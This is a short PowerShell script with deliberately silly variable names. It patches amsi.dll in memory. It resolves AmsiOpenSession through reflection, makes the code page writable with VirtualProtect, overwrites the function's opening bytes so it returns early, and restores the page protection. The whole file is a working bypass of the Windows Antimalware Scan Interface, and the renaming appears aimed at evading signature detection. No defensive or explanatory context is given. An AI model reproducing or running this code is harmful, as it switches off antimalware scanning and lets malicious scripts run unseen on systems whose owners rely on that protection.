function Pepper {
    Param ($Bruhh, $wowzers)

    $howmany = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }).
    GetType('Microsoft.Win32.UnsafeNativeMethods')
    $timesdo=@()
    $howmany.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$timesdo+=$_}}
    return $timesdo[0].Invoke($null, @(($howmany.GetMethod('GetModuleHandle')).
    Invoke($null,@($Bruhh)), $wowzers))
}

#
#
#
#
#
function Ihaveto {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $Dothis,
        [Parameter(Position = 1)] [Type] $replacements = [Void]
    )

    $Strategy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])

    $Strategy.DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $Dothis).
    SetImplementationFlags('Runtime, Managed')

    $Strategy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $replacements, $Dothis).
    SetImplementationFlags('Runtime, Managed')

    return $Strategy.CreateType()

}

[IntPtr]$Muffins = Pepper amsi.dll AmsiOpenSession
$itisvery = 0
$veryfrustrating=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Pepper `
kernel32.dll VirtualProtect), (Ihaveto @([IntPtr], [Uint32], [Uint32], 
[Uint32].MakeByRefType()) ([Bool])))
$veryfrustrating.Invoke($Muffins, 3, 0x40, [ref]$itisvery)

$lostproperty = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($lostproperty, 0, $Muffins, 3)

$veryfrustrating.Invoke($Muffins, 3, 0x20, [ref]$itisvery)
